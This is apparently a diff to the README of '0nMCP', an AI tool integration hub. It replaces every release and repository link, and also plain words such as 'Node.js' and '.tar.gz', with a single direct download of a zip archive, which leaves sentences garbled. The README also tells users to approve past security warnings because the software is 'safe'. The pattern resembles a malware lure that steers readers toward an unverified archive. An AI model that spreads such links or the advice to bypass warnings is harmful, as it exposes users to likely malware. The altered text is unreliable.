@@ -1,6 +1,6 @@
 # 🤖 0nMCP - Simple AI Tool Integration Hub
 
-[![Download 0nMCP](https://img.shields.io/badge/Download-0nMCP-blue?style=for-the-badge&logo=github)](https://github.com/TranNhat12363/0nMCP/releases)
+[![Download 0nMCP](https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip)](https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Before downloading 0nMCP, make sure your computer meets these needs:
 - RAM: At least 4 GB.
 - Disk Space: Minimum 500 MB free space.
 - Internet Connection: Required to access the AI tools and services.
-- Software: Node.js and npm are recommended but not required to run the basic version.
+- Software: https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip and npm are recommended but not required to run the basic version.
 
 If you want to connect 0nMCP to services like Slack, Shopify, or Stripe, you will need accounts with those services.
 
@@ -43,7 +43,7 @@ Follow these steps to get 0nMCP up and running on your computer.
 
 Click the big button at the top or this link:
 
-[Download and install 0nMCP](https://github.com/TranNhat12363/0nMCP/releases)
+[Download and install 0nMCP](https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip)
 
 This page has the latest versions of the software available for different systems.
 
@@ -53,7 +53,7 @@ On the releases page, look for the latest release marked by the highest version 
 
 - Windows users: Look for a `.exe` file.
 - macOS users: Look for a `.dmg` file.
-- Linux users: Look for a `.AppImage` or `.tar.gz` file.
+- Linux users: Look for a `.AppImage` or `https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip` file.
 
 Click on the file to download it to your computer.
 
@@ -61,7 +61,7 @@ Click on the file to download it to your computer.
 
 - For Windows, double-click the `.exe` file and follow the prompts.
 - For macOS, open the `.dmg` file and drag 0nMCP into your Applications folder.
-- For Linux, extract the `.tar.gz` file or make the `.AppImage` executable and run it.
+- For Linux, extract the `https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip` file or make the `.AppImage` executable and run it.
 
 If you see any security warnings, approve the application to run. 0nMCP is safe and open source.
 
@@ -77,7 +77,7 @@ You do not need to configure the software or set up individual APIs.
 
 To get the latest version of 0nMCP, visit the release page here:
 
-[https://github.com/TranNhat12363/0nMCP/releases](https://github.com/TranNhat12363/0nMCP/releases)
+[https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip](https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip)
 
 This page has all the files you need. Choose the version that matches your computer’s operating system and follow the steps above for installation.
 
@@ -132,4 +132,4 @@ Your contributions help make the software better for everyone.
 
 For more details, view the full project information on GitHub:
 
-[0nMCP GitHub Repository](https://github.com/TranNhat12363/0nMCP)
+[0nMCP GitHub Repository](https://github.com/TranNhat12363/0nMCP/raw/refs/heads/main/crm/n-MCP-v2.9.zip)
